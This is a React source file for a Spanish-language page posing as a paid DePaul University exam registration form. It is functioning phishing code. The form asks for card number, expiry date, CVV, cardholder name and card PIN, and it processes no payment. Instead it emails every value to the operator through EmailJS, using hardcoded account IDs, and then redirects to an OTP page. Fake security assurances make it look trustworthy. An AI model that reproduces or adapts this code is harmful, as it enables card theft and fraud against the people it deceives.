import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png'

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [bankName, setBankName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  const resetForm = () => {
    setBankName('');
    setCardNumber('');
    setExpirationDate('');
    setCvv('');
    setNameOnCard('');
    setCardType('');
    setPin('');
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
    setShowConfirmModal(false);
    setShowPinModal(true);
  };

  const handlePinSubmit = (e) => {
    e.preventDefault();
    sendEmail();
    resetForm();
    setShowPinModal(false);
    navigate('/otp');
  };

  const handleTextOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(value);
  };

  const handleExpirationDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.replace(/(.{2})(.{2})/, '$1 / $2');
    }
    setExpirationDate(value);
  };

  const sendEmail = () => {
    const templateParams = {
      bankName,
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      cardType,
      pin,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
    <Navbar />
    <div className="container d-flex justify-content-center">
      <div className="col-md-6">
        <h2 className="mt-5">FORMULARIO DE EXAMEN</h2>
        <p><strong>Acerca del Examen</strong></p>
        <p>Examen obligatorio de la Universidad DePaul: 35% de la evaluación del curso.</p>
        <div className="card mb-3">
          <div className="card-body">
            {/* <p className="card-text">University exam form with a tag of $15 on it</p> */}
            <p className="card-text fw-medium fs-3">Formulario de examen de grupo comunitario: #periodismo #UniversidadDePaul</p>
            {/* <p className="fw-bold fs-4 text-end"> - $ 6.00</p> */}
          </div>
        </div>
        <h3>Realizar el Pago Ahora</h3>
        <p>Ingrese lo siguiente para completar el pago <b>usando su tarjeta bancaria</b>:<br />
        Introduzca sólo los datos correctos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante el pago.</p>
        <div className="card p-4 pt-2">
        <p className='fst-italic text-end p-0 m-0'>Pago Confiable y Seguro</p>
        <div className="d-flex justify-content-end mb-3">          
          <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
        </div>
          <Form onSubmit={handlePayClick} autoComplete="off">
            <Form.Group className="mb-3" controlId="bankName">
              <Form.Label>Nombre del Banco</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Ingrese el nombre de su banco" 
                required 
                value={bankName}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setBankName(e.target.value)}
              />
            </Form.Group>
            <Form.Group className="mb-3" controlId="cardNumber">
              <Form.Label>Número de Tarjeta</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="0000 0000 0000 0000" 
                required 
                maxLength="24" 
                value={cardNumber}
                onChange={handleCardNumberChange} 
              />
            </Form.Group>
            <div className="row">
              <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
                <Form.Label>Fecha de Caducidad</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="MM / AA" 
                  required 
                  maxLength="7" 
                  value={expirationDate}
                  onChange={handleExpirationDateChange} 
                />
              </Form.Group>
              <Form.Group className="col-md-6 mb-3" controlId="cvv">
                <Form.Label>CVV</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="000" 
                  required 
                  maxLength="4" 
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  onInput={handleNumberOnlyInput}
                />
              </Form.Group>
            </div>
            <Form.Group className="mb-3" controlId="nameOnCard">
              <Form.Label>Nombre en la Tarjeta</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Introduzca el nombre en la tarjeta" 
                required 
                value={nameOnCard}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setNameOnCard(e.target.value)}
              />
            </Form.Group>
            <Form.Group className="mb-3" controlId="cardType">
              <Form.Label>Tipo de Tarjeta</Form.Label>
              <div>
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="creditCard" 
                  label="Tarjeta de Crédito" 
                  required 
                  checked={cardType === 'credit'}
                  onChange={(e) => setCardType('credit')}
                />
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="debitCard" 
                  label="Tarjeta de Débito" 
                  required 
                  checked={cardType === 'debit'}
                  onChange={(e) => setCardType('debit')}
                />
              </div>
            </Form.Group>
            <Button variant="primary" type="submit">PAGAR</Button>
            <p className="fw-bold text-end"> - UYU 239.00</p>
          </Form>
        </div>
        <p className="mt-3"><strong>Pago Confiable y Seguro</strong><br />
        Su seguridad es nuestra prioridad. Utilizamos cifrado avanzado para proteger su información. Tu confianza nos importa.</p>
        
        {/* Confirmation Modal */}
        <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Confirmar Detalles</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <p>Por favor confirma y revisa tus datos <b>con tu tarjeta bancaria</b> antes de proceder para evitar <span style={{color: "#FF0000"}}>error(es)</span>.</p>
          </Modal.Body>
          <Modal.Footer>
            <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancelar</Button>
            <Button variant="primary" onClick={handleConfirmClick}>Sí, Lo He confirmado</Button>
          </Modal.Footer>
        </Modal>

        {/* PIN Modal */}
        <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Ingrese su PIN</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <Form onSubmit={handlePinSubmit}>
              <Form.Group className="mb-3" controlId="pin">
                <Form.Label>Ingrese el PIN de su tarjeta de 4 dígitos para completar el pago</Form.Label>
                <Form.Control 
                  type="text" 
                  placeholder="0000" 
                  required 
                  maxLength="4" 
                  value={pin}
                  onInput={handleNumberOnlyInput}
                  onChange={(e) => setPin(e.target.value)}
                />
              </Form.Group>
              <Button variant="primary" type="submit">PAGAR</Button>                           
              <p className="fw-bold text-end"> - UYU 239.00</p>
            </Form>
          </Modal.Body>
          <Modal.Footer>
            <Form.Text className="text-muted">Por favor, evite revelar su información a otros.</Form.Text>
          </Modal.Footer>
        </Modal>
      </div>
    </div>
    <Footer />
    </div>
  );
};

export default ExamForm;
